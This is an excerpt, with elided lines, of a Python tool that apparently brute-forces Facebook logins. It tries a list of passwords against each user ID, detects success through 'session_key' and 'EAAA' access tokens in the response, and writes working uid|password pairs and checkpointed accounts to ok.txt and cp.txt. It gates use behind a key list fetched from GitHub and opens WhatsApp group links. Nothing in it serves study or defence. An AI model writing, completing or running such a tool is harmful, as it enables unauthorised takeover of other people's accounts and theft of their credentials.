...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/jahied/approval.-txt/blob/main/appro.txt"])
...
def notice():
	...
	os.system("xdg-open https://chat.whatsapp.com/FK5mDR4T2By4KxLwRyhzjx/?app=fbl")
	subprocess.check_output(["am", "start", "https://chat.whatsapp.com/FK5mDR4T2By4KxLwRyhzjx/?app=fbl"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/jahied/approval.-txt/blob/main/appro.txt').text
			if basesplit in plr:
				key = basesplit
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=JAHIED=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=JAHIED=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=JAHIED=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=JAHIED=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
